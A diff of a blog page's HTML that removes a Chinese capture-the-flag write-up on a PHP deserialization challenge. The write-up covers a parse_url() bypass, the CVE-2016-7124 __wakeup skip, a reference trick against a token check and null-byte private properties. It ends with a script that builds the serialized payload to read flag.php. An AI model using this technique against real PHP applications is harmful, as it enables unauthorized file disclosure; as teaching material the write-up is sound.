class="keyword">class</span> <span class="title">Handle</span></span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $handle;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Waking up\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($handle)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = $handle; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle-&gt;getFlag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">                                                    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> $token_flag;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token_flag = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">                <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file,<span class="keyword">true</span>); </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>关键代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line">@<span class="keyword">include</span>($file);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($payload))&#123;  </span><br><span class="line">    $url = parse_url($_SERVER[<span class="string">'REQUEST_URI'</span>]);</span><br><span class="line">    parse_str($url[<span class="string">'query'</span>],$query);</span><br><span class="line">    <span class="keyword">foreach</span>($query <span class="keyword">as</span> $value)&#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/flag/"</span>,$value)) &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $payload = unserialize($payload);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>代码第一行包含文件，此处我们包含的文件应该是hint.php</p>
-<p>接着，绕过parse_url(),我们使用’///‘可对parse_url()函数进行绕过</p>
-<p>原理：This function is intended specifically for the purpose of parsing URLs and not URIs. However, to comply with PHP’s backwards compatibility requirements it makes an exception for the file:// scheme where triple slashes (file:///…) are allowed. For any other scheme this is invalid.<br>参考：<a href="https://php.net/manual/en/function.parse-url.php" target="_blank" rel="noopener">php.net-parse_url()</a></p>
-<p>当使用’///‘时将会返回null,此时对下列的代码起到绕过作用。<br>接着进行反序列化操作，关键代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $handle;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Waking up\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($handle)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = $handle; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle-&gt;getFlag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>然后我们这里需要关注的点是<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Waking up\n"</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
-<p>所有成员变量将会被转为null.通过CVE-2016-7124可以绕过<strong>wakeup().<br>参考：[php 反序列化绕过魔术方法</strong>wakeup(CVE-2016-7124)](<a href="http://www.she1don.cn/index.php/archives/20.html" target="_blank" rel="noopener">http://www.she1don.cn/index.php/archives/20.html</a>)<br>魔术方法<strong>wakeup()触发于 unserilize()调用之前, 当反序列化时的字符串所对应的对象的数目被修改,魔术方法</strong>wakeup()的函数就不会被调用.<br>关键代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;handle-&gt;getFlag();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>调用getFlag()函数，所以可知我们构造序列化文本时，$handle便要为class flag.<br>关键代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//$this-&gt;token_flag = md5(rand(1,10000));</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">            <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file,<span class="keyword">true</span>); </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>然后我们要关注的是这里的$file要为”flag.php”<br>然后需要绕过验证’$this-&gt;token === $this-&gt;token_flag’，这里使用引用绕过，<br>参考文章：<a href="https://blog.csdn.net/alen_xiaoxin/article/details/56011299" target="_blank" rel="noopener">https://blog.csdn.net/alen_xiaoxin/article/details/56011299</a><br>上面代码中还有一个问题<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> $handle;</span><br></pre></td></tr></table></figure></p>
-<p>所以这里我们要在handle前用%00<br>其实这个知识点我不是很了解，所以这里做一个拓展，<br>参考文章：<a href="https://xz.aliyun.com/t/3674" target="_blank" rel="noopener">https://xz.aliyun.com/t/3674</a><br>测试代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class">   </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $flag = <span class="string">"flag&#123;233&#125;"</span>;</span><br><span class="line">    <span class="keyword">public</span> $a = <span class="string">"aaa"</span>;</span><br><span class="line">    <span class="keyword">static</span> $b = <span class="string">"bbb"</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   $test = <span class="keyword">new</span> test;</span><br><span class="line">   $data = serialize($test);</span><br><span class="line">   <span class="keyword">echo</span> $data;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">   $consequence = urlencode($data);</span><br><span class="line">   <span class="keyword">echo</span> $consequence;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>先看一下例子，测试结果是：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">"test"</span>:<span class="number">2</span>:&#123;s:<span class="number">10</span>:<span class="string">"testflag"</span>;s:<span class="number">9</span>:<span class="string">"flag&#123;233&#125;"</span>;s:<span class="number">1</span>:<span class="string">"a"</span>;s:<span class="number">3</span>:<span class="string">"aaa"</span>;&#125;</span><br><span class="line"></span><br><span class="line">O%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>test%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>test%<span class="number">00</span>flag%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>flag%<span class="number">7</span>B233%<span class="number">7</span>D%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">22</span>a%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>aaa%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure></p>
-<p>有没有发现一个问题，就是private修饰的变量，它的字符长度为10而不是8，这是因为它是private属性，翻阅文档就可以看到说明，它会在两侧加入空字节。所以我们构造的时候也要记得带上空字节。</p>
-<p>综上所有问题，我们开始构造payload.(个人觉得构造payload对我这个新手来说还是挺痛苦的，所以可以一步一步慢慢来，根据上面的绕过一点一点加进去)</p>
-<p>然后这里我们通过使用代码生成payload:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $handle;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($handle)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = $handle; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle-&gt;getFlag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> $token_flag;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token = &amp;<span class="keyword">$this</span>-&gt;token_flag;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;token_flag = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">                <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file,<span class="keyword">true</span>); </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$flag = <span class="keyword">new</span> Flag(<span class="string">'flag.php'</span>);</span><br><span class="line">$handle = <span class="keyword">new</span> Handle($flag);</span><br><span class="line"><span class="keyword">echo</span> urlencode(str_replace(<span class="string">'O:6:"Handle":1'</span>, <span class="string">'O:6:"Handle":10'</span>, serialize($handle)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>这里的引用绕过体现在这段代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;token = &amp;<span class="keyword">$this</span>-&gt;token_flag;</span><br></pre></td></tr></table></figure></p>
-<p>最后生成序列化文本,然后payload为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=hint.php&amp;payload=以上获取的序列化文本</span><br></pre></td></tr></table></figure></p>
-<p>最后贴一个PHP反序列化标识符含义：</p>
-<p>a - array<br>b - boolean<br>d - double<br>i - integer<br>o - common object<br>r - reference<br>s - string<br>C - custom object<br>O - class<br>N - null<br>R - pointer reference<br>U - unicode string</p>
-<h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><p>这道题确实当时做不出来，一方面是自己的水平不够，很多知识点都没有掌握，然后这道题别人的wp都是简略写，但是我是希望能借此仔细学习一下这几个知识点，并且这道题里通过脚本生成序列化文本，然后觉得很赞，多学习学习。</p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2091,7 +2096,7 @@
         
           <a href="/archives/">
         
-          <span class="site-state-item-count">68</span>
+          <span class="site-state-item-count">69</span>
           <span class="site-state-item-name">Artikel</span>
         </a>
       </div>
